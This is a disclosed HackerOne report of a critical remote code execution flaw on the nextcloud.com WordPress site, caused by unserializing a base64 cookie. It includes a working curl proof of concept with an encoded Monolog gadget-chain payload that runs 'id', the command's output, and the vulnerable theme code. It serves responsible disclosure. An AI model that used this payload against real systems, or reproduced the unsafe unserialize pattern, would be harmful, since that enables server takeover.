# RCE on Wordpress website

## Report Details
- **Report ID**: 2248328
- **URL**: https://hackerone.com/reports/2248328
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2023-11-10T20:55:17.196Z
- **Disclosed**: 2023-12-28T11:11:00.101Z

## Reporter
- **Username**: lukasreschke
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
There is a trivial to exploit Remote Code Execution on nextcloud.com due to unserializing user input.

# Proof of concept
The following command will execute the `system('id')` command on the host. As gadget chain I've used Monolog which is included in the PodLove WordPress plugin used on nextcloud.com: 

```
curl -i -s -k -X $'GET' \
    -H $'Host: nextcloud.com' \
    -b $'nc_cookie_banner={\"essentials\":true,\"convenience\":false,\"statistics\":{\"matomo\":false},\"external_media\":{\"youtube\":false,\"vimeo\":false}}; wp-wpml_current_language=en; nc_form_fields=TzozNzoiTW9ub2xvZ1xIYW5kbGVyXEZpbmdlcnNDcm9zc2VkSGFuZGxlciI6NDp7czoxNjoiACoAcGFzc3RocnVMZXZlbCI7aTowO3M6MTA6IgAqAGhhbmRsZXIiO3I6MTtzOjk6IgAqAGJ1ZmZlciI7YToxOntpOjA7YToyOntpOjA7czoyOiJpZCI7czo1OiJsZXZlbCI7aToxMDA7fX1zOjEzOiIAKgBwcm9jZXNzb3JzIjthOjI6e2k6MDtzOjM6InBvcyI7aToxO3M6Njoic3lzdGVtIjt9fQ==' \
    $'https://nextcloud.com/newsletter/'
```

The last line of the response will contain the output of the `id` command:
```
<!-- Performance optimized by Redis Object Cache. Learn more: https://wprediscache.com -->uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# Vulnerable lines of code
The `unserialize` call in the below code paths is performed on user-input. (`$_COOKIE['nc_form_fields']`)

https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L114
```php
add_filter( 'ninja_forms_render_default_value', 'nc_change_nf_default_value', 10, 3 );
function nc_change_nf_default_value( $default_value, $field_type, $field_settings ) {
    
    if(isset($_COOKIE['nc_form_fields'])){
        $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));

        if( str_contains($field_settings['key'], 'name') && !str_contains($field_settings['key'], 'organization') ){
                if(isset($nc_form_fields['nc_form_name'])) {
                    $default_value = $nc_form_fields['nc_form_name'];
                }
        }
        if( str_contains($field_settings['key'], 'email') ){
                if(isset($nc_form_fields['nc_form_email'])) {
                    $default_value = $nc_form_fields['nc_form_email'];
                }
        }
        if( str_contains($field_settings['key'], 'phone') ){
                if(isset($nc_form_fields['nc_form_phone'])) {
                    $default_value = $nc_form_fields['nc_form_phone'];
                }
        }
    }

  return $default_value;
}
```

https://github.com/nextcloud/nextcloud-theme/blob/e6db0a90391ec94f9eb6d86e16dc16e36c5f4dd4/inc/ninjaforms.php#L431
```php
add_filter( 'ninja_forms_render_options', function( $options, $settings ) {
    
    //https://www.html-code-generator.com/php/array/languages-name-and-code
    $languages_list = array(
        'en' => 'English',
        // [snip]
        'zu' => 'Zulu - isiZulu'
    );

    if(str_contains($settings['key'], 'language')) {

        $options = [];
        $browser_lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);

        $pref_lang = '';
        if(isset($_COOKIE['nc_form_fields'])){
            $nc_form_fields = unserialize(base64_decode($_COOKIE['nc_form_fields']));
            if( isset($nc_form_fields['nc_form_lang'])){
                $pref_lang = $nc_form_fields['nc_form_lang'];
            }
        } else {
            $pref_lang = $browser_lang;
        }


        foreach($languages_list as $code => $language) {
            $selected = false;

            if($pref_lang == $code){
                $selected = true;
            }

            $options[] = [
                'label' => $language,
                'value' => $code,
                'calc' => 0,
                'selected' => $selected
            ];

        }
        
    }
  
    return $options;
}, 10, 2 );
```

## Impact

RCE on the nextcloud.com WordPress instance. I have not tried to escalate up from the host, but I'd assume there is plenty of privilege escalation potential. (or at least the ability to set malicious download links for the Nextcloud binaries)

## Attachments
- recording-1699649659147.mp4
